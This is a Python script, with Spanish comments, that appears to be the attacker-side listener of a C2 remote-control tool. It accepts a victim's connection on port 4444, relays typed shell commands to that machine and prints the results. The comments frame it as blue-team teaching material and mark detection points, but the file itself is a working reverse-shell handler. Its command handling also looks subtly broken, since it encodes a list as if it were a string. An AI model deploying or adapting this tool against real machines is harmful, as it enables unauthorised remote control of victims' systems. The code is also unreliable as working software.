#!/usr/bin/env python3
# =============================================================================
# C2 SERVER - LADO DEL ATACANTE (Command & Control)
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# =============================================================================

import socket,json # │ IMPORTACIÓN DE LIBRERÍAS

class Listener:

    def __init__(self, ip, port):
       
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # │ CREACIÓN DEL SOCKET
    
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # │ CONFIGURACIÓN DE OPCIONES DEL SOCKET 

        listener.bind((ip, port))  # │ ENLACE DEL PUERTO (BIND) - PUNTO DE DETECCIÓN #1 ⚠️ 

        listener.listen(0) # │ INICIAR ESCUCHA (LISTEN)  

        print("[+] Esperando Conexiones") # │ MENSAJE DE ESTADO - HUELLA FORENSE #1   


        self.connection, address = listener.accept() # │ ACEPTAR CONEXIÓN - PUNTO DE DETECCIÓN #2 ⚠️  

        print("[+] Tenemos una conexion de " + str(address)) # │ CONFIRMACIÓN DE CONEXIÓN - HUELLA FORENSE #2  
    
    def ejecutarRemoto(self,command): # │ ENVÍO DE COMANDO A LA VÍCTIMA - PUNTO DE DETECCIÓN #3 ⚠️  

        self.connection.send(command.encode('utf-8'))

        if command =="salir":
            self.connection.close()
            exit()
            
        return self.reliable_receive()

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data=""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except ValueError:
                continue
                        

    def run(self): # │ BUCLE PRINCIPAL - CONTROL REMOTO ACTIVO  

        while True: # 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos) 
 
            command = input("shell »» " ) # │ ENTRADA DE COMANDOS - HUELLA FORENSE #3 

            command = command.split(" ")
            result = self.ejecutarRemoto(command)
            print(result)

escuchar=Listener("192.168.1.33",4444)
escuchar.run()